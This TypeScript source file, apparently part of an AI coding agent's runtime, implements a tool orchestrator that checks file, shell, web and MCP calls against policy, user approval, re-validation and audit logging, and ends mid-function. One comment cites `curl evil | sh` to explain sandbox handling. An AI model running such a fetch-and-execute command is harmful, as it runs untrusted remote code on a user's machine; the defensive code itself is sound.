import {createHash} from 'node:crypto';
import {
  FutrynError,
  toolResultSchema,
  type CommandOutputChunk,
  type PermissionDecision,
  type SubagentEvent,
  type ToolCall,
  type ToolResult,
} from '@cosmew/contracts';
import {
  classifyCommand,
  commandText,
  evaluateRead,
  evaluateExec,
  evaluateStdin,
  evaluateWrite,
  matchesExcludedCommand,
} from '@cosmew/security';
import {ensureShellParser, shellParsers} from './exec/shell-parse';
import {toCodePointColumn, type LspDiagnostic} from '@cosmew/code-intel';
import {WriteBoundaryError, WorkspaceDenied, type ResolvedPath} from '@cosmew/workspace';
import {
  commandGrantTarget,
  effectiveSandboxMode,
  sandboxConfig,
  type ApprovalRequest,
  type Audit,
  type ToolDispatcherOptions,
  type ToolOutput,
} from './context';
import type {PreparedTool} from './handlers/types';
import {join} from 'node:path';
import {
  resolveWorkspacePath,
  readTargetDecision,
  outsideWorkingDirectories,
  OUTSIDE_WORKING_DIRECTORIES_MESSAGE,
} from './working-roots';
import {clipBytes} from './limits';
import {plainTerminalText} from './exec/output';
import {ToolRouter} from './router';
import {outputPermissionContext} from './output-archive';

type Authorization = {
  gate: ToolOutput | null;
  viaSession: boolean;
  scopeHash?: string;
  sourceRead?: {file: ResolvedPath; decision: PermissionDecision};
  readDecision?: PermissionDecision;
};

/** Shared invocation lifecycle. Discovery never replaces policy, approval or launch-time checks. */
export class ToolOrchestrator {
  // Only in-flight duplicates are fenced. Completed calls are not cached/replayed across grants.
  private readonly active = new Set<string>();
  constructor(
    private readonly options: ToolDispatcherOptions,
    private readonly router: ToolRouter,
  ) {}

  async invoke(
    call: ToolCall,
    signal?: AbortSignal,
    onOutput?: (chunk: CommandOutputChunk) => void,
    onEvent?: (event: SubagentEvent) => void,
    userSkill = false,
  ): Promise<ToolResult> {
    signal?.throwIfAborted();
    const audit: Audit = record =>
      this.options.audit?.({
        at: new Date().toISOString(),
        callId: call.id,
        tool: call.name,
        ...record,
        target: record.target === null ? null : this.options.redact(record.target),
      });
    let authorizationScopeHash: string | undefined;
    let archiveSource: import('@cosmew/contracts').OutputArchiveSource | undefined;
    let archiveContext: string | undefined;
    let archiveScope: import('@cosmew/contracts').OutputArchiveScope | undefined;
    const finish = (result: ToolOutput): ToolResult => {
      let content = this.options.redact(result.content);
      let pointer = '';
      let evidenceOutputId: string | undefined;
      const attachments = result.attachments?.map(a => ({
        ...a,
        ...(a.name ? {name: this.options.redact(a.name)} : {}),
      }));
      // Producer text (including any marker-looking text) is hashed verbatim. Only host metadata
      // added below is excluded; never trust a remote producer's digest or archive handle.
      const evidenceDigest = createHash('sha256')
        .update(JSON.stringify([content, attachments ?? null, !!result.truncated]))
        .digest('hex');
      // Best-effort evidence persistence must never turn a completed side effect into a retryable failure.
      if (
        archiveSource &&
        archiveScope?.session &&
        archiveContext &&
        result.status !== 'denied' &&
        (Buffer.byteLength(content) > 24000 || result.truncated)
      ) {
        try {
          const outputId = this.options.outputArchive!.store.put(archiveScope, {
            content,
            source: {...archiveSource, truncated: !!result.truncated},
            permissionContext: archiveContext,
            sourceTruncated: !!result.truncated,
          });
          evidenceOutputId = outputId;
          pointer = `\n\n[tool_output output_id=${outputId}; use tool_output to retrieve archived evidence]`;
        } catch {
          pointer = '\n\n[tool_output unavailable: archive storage failed; captured evidence cannot be retrieved.]';
        }
      }
      const budget = call.name === 'skill' ? 65536 : 60000;
      const clipped = clipBytes(content, budget - Buffer.byteLength(pointer));
      content = clipped.text + pointer;
      const final = toolResultSchema.parse({
        ...result,
        evidenceDigest,
        evidenceOutputId,
        ...(result.skillDirectory ? {skillDirectory: this.options.redact(result.skillDirectory)} : {}),
        ...(result.target ? {target: this.options.redact(result.target)} : {}),
        ...(result.attachments ? {attachments} : {}),
        content,
        truncated: result.truncated || clipped.clipped || undefined,
        callId: call.id,
        name: call.name,
        ...(authorizationScopeHash ? {authorizationScopeHash} : {}),
      });
      audit({target: final.target ?? null, phase: 'completed', outcome: final.status, code: final.code});
      return final;
    };
    audit({target: null, phase: 'requested'});
    if (this.active.has(call.id))
      return finish({
        status: 'error',
        code: 'DUPLICATE_CALL',
        content: 'A tool call with this ID is already in progress.',
      });
    this.active.add(call.id);
    try {
      const resolved = this.router.resolve(call.name);
      if (!('handler' in resolved)) return finish(resolved);
      let prepared = resolved.handler.prepare(call.input, userSkill);
      // A tool that must ask a helper (language server) before it knows its effect resolves first;
      // what it resolves to then goes through the same validation, policy and approval (ADR 0043).
      if ('kind' in prepared && prepared.kind === 'deferred') {
        const read = await this.authorizeRead(call.name, prepared.file, audit, signal);
        if (read.gate) return finish(read.gate);
        signal?.throwIfAborted();
        const denied = this.revalidateRead(prepared.file, read.viaSession, audit, true, undefined, read.readDecision);
        if (denied) return finish(denied);
        const current = this.router.resolve(call.name);
        if (!('handler' in current) || current.handler !== resolved.handler)
          return finish({status: 'denied', code: 'DENIED', content: 'The tool registration changed before execution.'});
        prepared = await prepared.resolve(signal);
      }
      signal?.throwIfAborted();
      if (!('kind' in prepared) || prepared.kind === 'deferred') {
        if (!('kind' in prepared) && prepared.status === 'denied')
          audit({target: null, phase: 'decided', decision: 'deny', reason: 'write-boundary'});
        if ('kind' in prepared)
          return finish({status: 'error', code: 'INVALID_STATE', content: 'The tool did not resolve.'});
        return finish(prepared);
      }
      if (prepared.kind === 'web-fetch') {
        prepared.authorize = async (url, fetchSignal) => {
          const gate = await this.authorizeWeb(call.name, url, false, audit, fetchSignal);
          if (gate.gate) return false;
          fetchSignal?.throwIfAborted();
          const route = this.router.resolve(call.name);
          return 'handler' in route && route.handler === resolved.handler;
        };
      }
      const authorization =
        prepared.kind === 'output'
          ? await this.authorizeOutput(prepared, audit, signal)
          : prepared.kind === 'patch'
            ? await this.authorizePatch(call.name, prepared, audit, signal)
            : prepared.kind === 'command'
              ? await this.authorizeCommand(prepared, audit, signal)
              : prepared.kind === 'read'
                ? await this.authorizeRead(call.name, prepared.file, audit, signal, true, !!prepared.revalidate)
                : prepared.kind === 'web-search'
                  ? await this.authorizeWeb(call.name, prepared.target, true, audit, signal)
                  : prepared.kind === 'web-fetch'
                    ? {gate: null, viaSession: false}
                    : prepared.kind === 'state-write'
                      ? await this.authorizeStateWrite(call.name, prepared.target, audit, signal)
                      : prepared.kind === 'state' || prepared.kind === 'question'
                        ? this.authorizeState(audit, prepared.kind)
                        : prepared.kind === 'agent'
                          ? await this.authorizeAgent(call, prepared, audit, signal)
                          : prepared.kind === 'mcp'
                            ? await this.authorizeMcp(call.name, prepared.target, audit, signal, prepared.identity)
                            : await this.authorizeSearch(call.name, prepared, audit, signal);
      authorizationScopeHash = authorization.scopeHash;
      if (authorization.gate) return finish(authorization.gate);
      signal?.throwIfAborted();
      // Availability/exposure may change while an approval is pending. Never execute an old route.
      const current = this.router.resolve(call.name);
      if (!('handler' in current)) return finish(current);
      if (current.handler !== resolved.handler)
        return finish({status: 'denied', code: 'DENIED', content: 'The tool registration changed before execution.'});
      const revalidation =
        prepared.kind === 'read'
          ? this.revalidateRead(
              prepared.file,
              authorization.viaSession,
              audit,
              true,
              prepared.revalidate,
              prepared.readDecision ?? authorization.readDecision,
            )
          : prepared.kind === 'search'
            ? this.revalidateRead(
                prepared.file,
                authorization.viaSession,
                audit,
                true,
                undefined,
                authorization.readDecision,
              )
            : prepared.kind === 'command'
              ? this.revalidateCommand(prepared, authorization.viaSession, audit)
              : prepared.kind === 'output' && authorization.sourceRead
                ? this.revalidateOutputSource(prepared, authorization, audit)
                : null;
      if (revalidation) return finish(revalidation);
      if (prepared.kind === 'output' && !prepared.valid())
        return finish({
          status: 'denied',
          code: 'DENIED',
          content: 'Output permission context changed before retrieval.',
        });
      if (call.name === 'agent_message') {
        const denied = this.agentMessageRestriction();
        if (denied) return finish(denied);
      }
      if (prepared.kind === 'state-write') {
        const denied = this.stateWriteRestriction();
        if (denied) return finish(denied);
      }
      if (prepared.kind === 'patch') {
        const mode = sandboxConfig(this.options);
        if (mode.readOnly || mode.permissionMode === 'plan' || this.options.analysisOnly?.())
          return finish({
            status: 'denied',
            code: 'MODE_RESTRICTED',
            content: 'Read-only mode refuses file changes. Nothing was written.',
          });
        if (authorization.viaSession && !this.options.grants.has('fs.write', prepared.plan.scopeKey))
          return finish({
            status: 'denied',
            code: 'DENIED',
            content: 'Patch approval was revoked. No changes were made.',
          });
        prepared.runtime.revalidate(prepared.plan);
      }
      // Redact the cumulative prefix before emitting a delta: registered secrets split across chunks cannot leak.
      const raw = {stdout: '', stderr: ''},
        sent = {stdout: 0, stderr: 0};
      let streamed = 0;
      // Errors the language server already knew before a write (ADR 0043): only new ones are reported.
      const before = prepared.kind === 'patch' ? this.knownErrors(prepared.plan) : undefined;
      if (
        this.options.outputArchive &&
        ['read', 'search', 'command', 'web-fetch', 'web-search', 'mcp'].includes(prepared.kind)
      ) {
        const kind = prepared.kind;
        archiveSource = {
          tool: call.name,
          kind: kind === 'web-fetch' || kind === 'web-search' ? 'web' : (kind as 'read' | 'search' | 'command' | 'mcp'),
          target: this.options
            .redact(
              'file' in prepared
                ? prepared.file.relative
                : 'url' in prepared
                  ? prepared.url
                  : 'target' in prepared
                    ? prepared.target
                    : '',
            )
            .slice(0, 1000),
          truncated: false,
        };
        archiveContext = outputPermissionContext(this.options);
        archiveScope = this.options.outputArchive.scope();
      }
      const output = await prepared.execute(
        signal,
        onOutput
          ? chunk => {
              if (streamed >= 56000) return;
              const text = chunk.text.slice(0, 56000 - streamed);
              streamed += text.length;
              raw[chunk.stream] += text;
              const safe = plainTerminalText(this.options.redact(raw[chunk.stream], true));
              const delta = safe.slice(sent[chunk.stream]);
              sent[chunk.stream] = safe.length;
              if (delta) onOutput({stream: chunk.stream, text: delta});
            }
          : undefined,
        onEvent,
        call.id,
      );
      if (prepared.kind === 'patch' && before) return finish(await this.withDiagnostics(output, before, signal));
      return finish(output);
    } catch (error) {
      if (signal?.aborted || (error instanceof FutrynError && error.code === 'CANCELLED')) {
        audit({target: null, phase: 'completed', outcome: 'error', code: 'CANCELLED'});
        throw new FutrynError('CANCELLED');
      }
      if (error instanceof WriteBoundaryError)
        return finish({
          status: 'error',
          code: error.code,
          content: 'Patch targets changed or became unsafe. No changes were made.',
        });
      if (error instanceof WorkspaceDenied) {
        if (error.reason === 'outside-workspace') {
          audit({target: null, phase: 'decided', decision: 'deny', reason: error.reason});
          return finish({
            status: 'denied',
            code: 'DENIED',
            content: OUTSIDE_WORKING_DIRECTORIES_MESSAGE,
          });
        }
        if (error.reason === 'inaccessible')
          return finish({status: 'error', code: 'UNREADABLE', content: 'File metadata is inaccessible.'});
        if (error.reason === 'not-found')
          return finish({
            status: 'error',
            code: 'NOT_FOUND',
            content:
              'Path not found in the working directories; this is not a permission denial. Check the path with glob before retrying.',
          });
        return finish({status: 'error', code: 'INVALID_INPUT', content: 'Invalid path.'});
      }
      if (error instanceof FutrynError && error.code === 'TIMEOUT')
        return finish({
          status: 'error',
          code: 'TIMEOUT',
          content: 'The search took longer than 30 seconds and was stopped. Narrow the path, glob or pattern.',
        });
      return finish({status: 'error', code: 'EXECUTION_FAILED', content: 'The tool failed.'});
    } finally {
      this.active.delete(call.id);
    }
  }

  private async authorizeOutput(
    prepared: Extract<PreparedTool, {kind: 'output'}>,
    audit: Audit,
    signal?: AbortSignal,
  ): Promise<Authorization> {
    const deny = (): Authorization => {
      audit({target: null, phase: 'decided', decision: 'deny', reason: 'output-context-invalidated'});
      return {
        gate: {
          status: 'denied',
          code: 'DENIED',
          content:
            'Output access was invalidated by changed permissions, revoked grants or session/workspace identity.',
        },
        viaSession: false,
      };
    };
    if (!prepared.valid()) return deny();
    const effect = this.options.outputArchive?.policy?.();
    if (effect && effect !== 'allow') {
      const gate = await this.permission(
        {effect, reason: 'tool-output-read'},
        {tool: 'tool_output', capability: 'fs.read', target: 'tool_output', reason: 'tool-output-read'},
        'tool_output',
        'tool_output',
        audit,
        'Output retrieval denied by policy.',
        'Output retrieval denied by user.',
        signal,
      );
      if (gate.gate) return gate;
      if (!prepared.valid()) return deny();
    }

    if (prepared.source.kind === 'read' || prepared.source.kind === 'search') {
      const targetChanged = (): Authorization => {
        audit({target: prepared.source.target, phase: 'decided', decision: 'deny', reason: 'output-source-changed'});
        return {
          gate: {
            status: 'denied',
            code: 'TARGET_CHANGED',
            content:
              'The archived source path changed or became unavailable. Read the source again under current permissions.',
          },
          viaSession: false,
        };
      };
      // The captured canonical target is the authorization identity. Resolving it to another
      // readable file must never substitute that file's permissions for the archived evidence.
      const resolveSource = (): ResolvedPath | undefined => {
        try {
          const file = resolveWorkspacePath(this.options, prepared.source.target);
          return file.relative === prepared.source.target ? file : undefined;
        } catch {
          return undefined;
        }
      };
      const file = resolveSource();
      if (!file) return targetChanged();
      const initialDecision = readTargetDecision(this.options, file);
      const authorization = await this.authorizeRead('tool_output', file, audit, signal);
      if (authorization.gate) return authorization;
      if (!prepared.valid()) return deny();
      const again = resolveSource();
      if (!again || again.absolute !== file.absolute || again.kind !== file.kind) return targetChanged();
      const gate = this.revalidateRead(file, authorization.viaSession, audit, true, undefined, initialDecision);
      return {gate, viaSession: authorization.viaSession, sourceRead: {file, decision: initialDecision}};
    }
    if (prepared.source.kind === 'mcp') {
      const authorization = await this.authorizeMcp(prepared.source.tool, prepared.source.target, audit, signal);
      if (authorization.gate) return authorization;
      if (!prepared.valid()) return deny();
      return authorization;
    }
    // No command/network replay: the unchanged effective policy and grants bound the captured data.
    audit({target: null, phase: 'decided', decision: 'allow', reason: 'output-current-permission-context'});
    return {gate: null, viaSession: false};
  }

  private revalidateOutputSource(
    prepared: Extract<PreparedTool, {kind: 'output'}>,
    authorization: Authorization,
    audit: Audit,
  ): ToolOutput | null {
    const source = authorization.sourceRead!;
    let again: ResolvedPath | undefined;
    try {
      again = resolveWorkspacePath(this.options, prepared.source.target);
    } catch {
      /* Fail closed below. */
    }
    if (
      !again ||
      again.relative !== prepared.source.target ||
      again.absolute !== source.file.absolute ||
      again.kind !== source.file.kind
    ) {
      audit({target: prepared.source.target, phase: 'decided', decision: 'deny', reason: 'output-source-changed'});
      return {
        status: 'denied',
        code: 'TARGET_CHANGED',
        content:
          'The archived source path changed or became unavailable. Read the source again under current permissions.',
      };
    }
    return this.revalidateRead(source.file, authorization.viaSession, audit, true, undefined, source.decision);
  }

  private async permission(
    decision: PermissionDecision,
    request: ApprovalRequest,
    grant: string,
    target: string,
    audit: Audit,
    deniedByPolicy: string,
    deniedByUser: string,
    signal?: AbortSignal,
    allowPrompt = true,
  ): Promise<Authorization> {
    const generation = this.options.grants.generationFor(request.capability);
    const scopeHash = createHash('sha256')
      .update(JSON.stringify([request.capability, grant]))
      .digest('hex');
    audit({target, phase: 'decided', decision: decision.effect, reason: decision.reason, scopeHash});
    if (decision.effect === 'deny')
      return {gate: {status: 'denied', code: 'DENIED', content: deniedByPolicy, target}, viaSession: false, scopeHash};
    if (decision.effect === 'allow') return {gate: null, viaSession: false, scopeHash};
    if (this.options.grants.has(request.capability, grant)) return {gate: null, viaSession: true, scopeHash};
    if (!allowPrompt)
      return {
        gate: {
          status: 'denied',
          code: 'APPROVAL_REQUIRED',
          content: 'Automatic instruction loading requires an existing permission grant.',
          target,
        },
        viaSession: false,
        scopeHash,
      };
    const answer = await this.options.approve(request, signal);
    signal?.throwIfAborted();
    if (this.options.grants.generationFor(request.capability) !== generation) {
      audit({target, phase: 'decided', decision: 'deny', reason: 'approval-revoked', scopeHash});
      return {
        gate: {
          status: 'denied',
          code: 'APPROVAL_REVOKED',
          content: 'Permissions changed while approval was pending. No changes were made. Request access again.',
          target,
        },
        viaSession: false,
        scopeHash,
      };
    }
    audit({target, phase: 'decided', decision: answer, reason: 'user', scopeHash});
    // Fail closed even if an injected approval adapter returns an unexpected value. `always` was
    // saved as a project rule by the adapter; it authorizes this call like `once` (ADR 0055).
    if (answer !== 'once' && answer !== 'session' && answer !== 'always')
      return {gate: {status: 'denied', code: 'DENIED', content: deniedByUser, target}, viaSession: false, scopeHash};
    if (answer === 'session') this.options.grants.grant(request.capability, grant);
    return {gate: null, viaSession: answer === 'session', scopeHash};
  }

  async authorizeRead(
    tool: string,
    file: ResolvedPath,
    audit: Audit,
    signal?: AbortSignal,
    allowPrompt = true,
    skillRead = false,
  ): Promise<Authorization> {
    const decision = readTargetDecision(this.options, file, skillRead);
    const result = await this.permission(
      decision,
      {tool, capability: 'fs.read', target: file.relative, reason: decision.reason},
      file.absolute,
      file.relative,
      audit,
      `Access denied by policy (${decision.reason}).`,
      'The user denied reading this file.',
      signal,
      allowPrompt,
    );
    return {...result, readDecision: decision};
  }

  revalidateRead(
    file: ResolvedPath,
    viaSession: boolean,
    audit: Audit,
    allowPrompt = true,
    resolve?: () => ResolvedPath,
    authorizedDecision?: PermissionDecision,
  ): ToolOutput | null {
    const again = resolve ? resolve() : resolveWorkspacePath(this.options, file.relative);
    const current = readTargetDecision(this.options, again, !!resolve);
    if (
      again.absolute !== file.absolute ||
      again.kind !== file.kind ||
      current.effect === 'deny' ||
      (authorizedDecision?.effect === 'allow' && current.effect === 'ask') ||
      (viaSession && !this.options.grants.has('fs.read', file.absolute))
    ) {
      audit({target: file.relative, phase: 'decided', decision: 'deny', reason: 'revalidation'});
      return {
        status: 'denied',
        code: !allowPrompt && current.effect === 'ask' ? 'APPROVAL_REQUIRED' : 'DENIED',
        content: 'Read access changed before execution.',
        target: file.relative,
      };
    }
    return null;
  }

  private knownErrors(plan: Extract<PreparedTool, {kind: 'patch'}>['plan']) {
    const lsp = this.options.codeIntel;
    if (!lsp?.available()) return undefined;
    const known = new Map<string, LspDiagnostic[] | undefined>();
    for (const change of plan.changes) {
      if (change.after === null) continue;
      try {
        const key = change.snapshot.identity ?? change.snapshot.path;
        const file = resolveWorkspacePath(this.options, key);
        if (readTargetDecision(this.options, file).effect !== 'allow') continue;
        known.set(key, lsp.knownErrors(file));
      } catch {
        known.set(change.snapshot.identity ?? change.snapshot.path, undefined);
      }
    }
    return known;
  }

  /**
   * After an applied write, the language server's new errors (ERROR only, at most 20 per file) are
   * added to the receipt as `diagnostics` (OpenCode v1 `edit.ts`). No server: nothing is added.
   */
  private async withDiagnostics(
    output: ToolOutput,
    before: Map<string, LspDiagnostic[] | undefined>,
    signal?: AbortSignal,
  ): Promise<ToolOutput> {
    if (output.status !== 'ok') return output;
    let receipt: Record<string, unknown>;
    try {
      receipt = JSON.parse(output.content) as Record<string, unknown>;
    } catch {
      return output;
    }
    const lines: string[] = [];
    for (const [path, baseline] of before) {
      let file;
      try {
        file = resolveWorkspacePath(this.options, path);
        if (readTargetDecision(this.options, file).effect !== 'allow') continue;
      } catch {
        continue;
      }
      const result = await this.options.codeIntel!.newErrors(file, baseline, signal).catch(() => undefined);
      if (!result) continue;
      const sourceLines = result.text.split('\n');
      for (const error of result.errors)
        lines.push(
          `${path}:${error.range.start.line + 1}:${toCodePointColumn(sourceLines[error.range.start.line] ?? '', error.range.start.character)}: error: ${error.message.split('\n')[0]!.slice(0, 300)}`,
        );
      if (result.more) lines.push(`${path}: ${result.more} more new error(s) not shown`);
    }
    if (!lines.length) return output;
    return {...output, content: JSON.stringify({...receipt, diagnostics: lines})};
  }

  /** Agent state touches no workspace, process or network: allowed, but audited like any call. */
  private async authorizeWeb(
    tool: string,
    url: string,
    search: boolean,
    audit: Audit,
    signal?: AbortSignal,
  ): Promise<Authorization> {
    let origin: string;
    try {
      const target = new URL(url);
      if (!['http:', 'https:'].includes(target.protocol) || target.username || target.password) throw new Error();
      origin = target.origin;
    } catch {
      return {
        gate: {
          status: 'denied',
          code: 'DENIED',
          content: 'Only public HTTP(S) URLs without credentials are supported.',
        },
        viaSession: false,
      };
    }
    return this.permission(
      {effect: 'ask', reason: search ? 'web-search' : 'web-fetch'},
      {
        tool,
        capability: search ? 'network.search' : 'network.connect',
        target: origin,
        reason: search ? 'web-search' : 'web-fetch',
        scopeKey: origin,
      },
      origin,
      origin,
      audit,
      'Web access was denied by policy.',
      'The user denied web access.',
      signal,
    );
  }

  private stateWriteRestriction(): ToolOutput | null {
    const analysis = this.options.analysisOnly?.();
    const config = sandboxConfig(this.options);
    if (!analysis && config.permissionMode !== 'plan' && !config.readOnly) return null;
    return {
      status: 'denied',
      code: 'MODE_RESTRICTED',
      content: `Memory write/delete is refused in ${analysis ? 'Plan/Review (analysis-only) mode' : config.permissionMode === 'plan' ? 'plan permission mode' : 'a read-only subagent'}. Nothing was written or deleted.`,
    };
  }

  private async authorizeStateWrite(
    tool: string,
    target: string,
    audit: Audit,
    signal?: AbortSignal,
  ): Promise<Authorization> {
    const restriction = this.stateWriteRestriction();
    if (restriction) {
      audit({target, phase: 'decided', decision: 'deny', reason: 'memory-read-only'});
      return {gate: restriction, viaSession: false};
    }
    // Always consult current policy, even after a session approval: project deny rules must win.
    // The adapter resolves normal edit policy without a prompt; untrusted asks.
    audit({target, phase: 'decided', decision: 'ask', reason: 'agent-state-edit'});
    const answer = await this.options.approve(
      {tool, capability: 'agent.state.write', target, reason: 'agent-state-edit'},
      signal,
    );
    signal?.throwIfAborted();
    audit({target, phase: 'decided', decision: answer, reason: 'user'});
    return {
      gate: ['once', 'session', 'always'].includes(answer)
        ? null
        : {
            status: 'denied',
            code: 'DENIED',
            content: 'Memory edit denied by policy or the user. Nothing was written or deleted.',
          },
      viaSession: false,
    };
  }

  private authorizeState(audit: Audit, kind: 'state' | 'question'): Authorization {
    audit({target: null, phase: 'decided', decision: 'allow', reason: kind === 'state' ? 'agent-state' : 'user-input'});
    return {gate: null, viaSession: false};
  }

  /** MCP tools can change remote state. Plan mode and a read-only agent never call them. */
  private async authorizeMcp(
    tool: string,
    target: string,
    audit: Audit,
    signal?: AbortSignal,
    identity?: string,
  ): Promise<Authorization> {
    const config = sandboxConfig(this.options);
    if (this.options.analysisOnly?.() || config.permissionMode === 'plan' || config.readOnly) {
      audit({target, phase: 'decided', decision: 'deny', reason: 'mcp-read-only'});
      return {
        gate: {
          status: 'denied',
          code: 'MODE_RESTRICTED',
          content: 'MCP tools are refused in plan mode and for a read-only agent. Nothing was called.',
          target,
        },
        viaSession: false,
      };
    }
    return this.permission(
      {effect: 'ask', reason: 'mcp-call'},
      {tool, capability: 'mcp.call', target, reason: 'mcp-call', scopeKey: `mcp:${target}:${identity ?? 'legacy'}`},
      identity ? `${target}:${identity}` : target,
      target,
      audit,
      'MCP call denied by policy.',
      'The user denied this MCP tool.',
      signal,
    );
  }

  private agentMessageRestriction(): ToolOutput | null {
    const config = sandboxConfig(this.options);
    if (!this.options.analysisOnly?.() && config.permissionMode !== 'plan' && !config.readOnly) return null;
    return {
      status: 'denied',
      code: 'MODE_RESTRICTED',
      content: 'Subagent messages are refused in Plan/Review or read-only mode. Nothing was sent.',
    };
  }

  private async authorizeAgent(
    call: ToolCall,
    prepared: Extract<PreparedTool, {kind: 'agent'}>,
    audit: Audit,
    signal?: AbortSignal,
  ): Promise<Authorization> {
    if (call.name !== 'agent_message') {
      audit({target: prepared.target, phase: 'decided', decision: 'allow', reason: 'subagent'});
      return {gate: null, viaSession: false};
    }
    const restriction = this.agentMessageRestriction();
    if (restriction) return {gate: restriction, viaSession: false};
    const sessionId = this.options.sessionId?.();
    const policy = this.options.toolPolicy?.(call.name);
    const scopeKey = createHash('sha256')
      .update(
        JSON.stringify({
          input: call.input,
          sessionId,
          workspace: this.options.workspace.root,
        }),
      )
      .digest('hex');
    audit({target: prepared.target, phase: 'decided', decision: 'ask', reason: 'subagent-message'});
    const answer = await this.options.approve(
      {
        tool: call.name,
        capability: 'agent.spawn',
        target: prepared.target,
        reason: 'subagent-message',
        scopeKey,
      },
      signal,
    );
    signal?.throwIfAborted();
    const currentPolicy = this.options.toolPolicy?.(call.name);
    const changed =
      sessionId !== this.options.sessionId?.() ||
      currentPolicy === 'deny' ||
      (currentPolicy === 'ask' && policy !== 'ask');
    const denied = this.agentMessageRestriction();
    audit({target: prepared.target, phase: 'decided', decision: answer, reason: 'user'});
    return {
      gate:
        denied ??
        (changed || !['once', 'session', 'always'].includes(answer)
          ? {
              status: 'denied',
              code: 'DENIED',
              content: 'Subagent message denied or its parent session changed. Nothing was sent.',
            }
          : null),
      viaSession: false,
    };
  }

  private async authorizeSearch(
    tool: string,
    prepared: Extract<PreparedTool, {kind: 'search'}>,
    audit: Audit,
    signal?: AbortSignal,
  ): Promise<Authorization> {
    const decision = readTargetDecision(this.options, prepared.file);
    if (decision.effect === 'deny') {
      audit({target: prepared.file.relative, phase: 'decided', decision: 'deny', reason: decision.reason});
      return {
        gate: {
          status: 'denied',
          code: 'DENIED',
          content: `Access denied by policy (${decision.reason}).`,
          target: prepared.file.relative,
        },
        viaSession: false,
        readDecision: decision,
      };
    }
    if (outsideWorkingDirectories(this.options, prepared.file.absolute))
      return this.authorizeRead(tool, prepared.file, audit, signal);
    // Listing returns names; grep independently authorizes every content read and skips asks.
    audit({target: prepared.file.relative, phase: 'decided', decision: 'allow', reason: prepared.reason});
    return {gate: null, viaSession: false, readDecision: decision};
  }

  private async authorizePatch(
    tool: string,
    prepared: Extract<PreparedTool, {kind: 'patch'}>,
    audit: Audit,
    signal?: AbortSignal,
  ): Promise<Authorization> {
    const {plan} = prepared;
    const config = sandboxConfig(this.options);
    if (config.readOnly || config.permissionMode === 'plan' || this.options.analysisOnly?.())
      return {
        gate: {
          status: 'denied',
          code: 'MODE_RESTRICTED',
          content: 'Read-only mode refuses file changes. Nothing was written.',
        },
        viaSession: false,
      };
    // Writes in the working directory follow the permission mode (acceptEdits approves them); a
    // read-only subagent profile has no writable root.
    const decisions = plan.changes.map(c => {
      const base = c.snapshot.base ?? this.options.workspace.root;
      const absolute = join(base, c.snapshot.path);
      const decision = evaluateWrite(c.snapshot.path, absolute, {
        stateDirectory: this.options.stateDirectory,
        writable: !outsideWorkingDirectories(this.options, absolute),
      });
      const rule = this.options.writePolicy?.(c.snapshot.identity ?? c.snapshot.path, absolute);
      if (decision.effect === 'deny') return decision;
      return rule ? {effect: rule, reason: 'project-write-rule'} : decision;
    });
    const denied = decisions.find(d => d.effect === 'deny');
    const decision = denied ??
      decisions.find(d => d.effect === 'ask' && d.reason === 'outside-writable-roots') ??
      decisions.find(d => d.effect === 'ask') ?? {effect: 'allow' as const, reason: 'project-write-rule'};
    const target = plan.changes
      .map(c => c.snapshot.identity ?? c.snapshot.path)
      .join(', ')
      .slice(0, 1024);
    return this.permission(
      decision,
      {
        tool,
        capability: 'fs.write',
        target,
        reason: decision.reason,
        scopeKey: plan.scopeKey,
        diffPreview: this.options.redact(
          plan.diff.replace(
            /[\x00-\x08\x0b-\x1f\x7f-\x9f\u200e\u200f\u202a-\u202e\u2066-\u2069]/g,
            ch => '\\u' + ch.charCodeAt(0).toString(16).padStart(4, '0'),
          ),
        ),
      },
      plan.scopeKey,
      target,
      audit,
      'Patch writes are denied by policy. No changes were made.',
      'The user denied this patch. No changes were made.',
      signal,
    );
  }

  /** The current mode of the OS sandbox for stdin review: what a launched terminal must not exceed. */
  private currentSandboxMode(): 'read-only' | 'workspace-write' | 'danger-full-access' {
    const config = sandboxConfig(this.options);
    return !config.enabled ? 'danger-full-access' : config.readOnly ? 'read-only' : 'workspace-write';
  }

  /** Does the whole command consist of commands excluded from the sandbox (`sandbox.excludedCommands`)? */
  private excludedFromSandbox(prepared: Extract<PreparedTool, {kind: 'command'}>): boolean {
    const config = sandboxConfig(this.options);
    if (!config.enabled || config.readOnly || !config.excludedCommands.length || prepared.escalation) return false;
    if (!prepared.runtime.capabilities?.().unsandboxed) return false;
    // Only a command that parses into plain sub-commands, every one of them excluded, leaves the
    // sandbox: `git status && curl evil | sh` stays sandboxed.
    const commands = prepared.classification?.commands;
    if (!commands?.length) return false;
    return commands.every(argv => {
      const text = commandText(argv);
      return config.excludedCommands.some(pattern => matchesExcludedCommand(pattern, text));
    });
  }

  /** Exec policy for a launch, or stdin review for input to an owned session (ADR 0034, 0061). */
  private commandDecision(prepared: Extract<PreparedTool, {kind: 'command'}>, file: ResolvedPath): PermissionDecision {
    const config = sandboxConfig(this.options);
    const decision = prepared.stdin
      ? this.stdinDecision(prepared.stdin, file, config.autoAllowBash)
      : evaluateExec(prepared.command, file.relative, file.absolute, {
          stateDirectory: this.options.stateDirectory,
          sandbox: prepared.sandbox,
          escalation: prepared.escalation === true,
          unsandboxedAllowed: config.allowUnsandboxed,
          autoAllow: config.autoAllowBash,
          excluded: prepared.excluded === true,
          classification: prepared.classification,
        });
    // Preserve hard denials and terminal transport (polls and interrupts).
    if (decision.effect !== 'ask' || !prepared.outsideCwd) return decision;
    if (config.permissionMode === 'plan') return {effect: 'deny', reason: 'plan-mode'};
    return {effect: 'ask', reason: 'outside-working-directories'};
  }

  private stdinDecision(
    stdin: NonNullable<Extract<PreparedTool, {kind: 'command'}>['stdin']>,
    file: ResolvedPath,
    autoAllow: boolean,
  ): PermissionDecision {
    const location = evaluateRead(file.relative === '.' ? '.' : file.relative + '/', file.absolute, {
      stateDirectory: this.options.stateDirectory,
    });
    if (location.effect === 'deny') return location;
    return evaluateStdin({...stdin, current: {mode: this.currentSandboxMode()}, autoAllow});
  }

  private commandGrant(prepared: Extract<PreparedTool, {kind: 'command'}>): string {
    const {command, file, runtimeId, executionKey, excluded, outsideCwd} = prepared;
    // An in-root grant cannot substitute for consent to an external cwd after trust changes.
    const scope = excluded || outsideCwd ? JSON.stringify([executionKey, Boolean(excluded), outsideCwd]) : executionKey;
    return commandGrantTarget(prepared.grantCommand ?? command, file.absolute, runtimeId, scope);
  }

  private async authorizeCommand(
    prepared: Extract<PreparedTool, {kind: 'command'}>,
    audit: Audit,
    signal?: AbortSignal,
  ): Promise<Authorization> {
    const {command, file, runtime, label} = prepared;
    if (!prepared.stdin) {
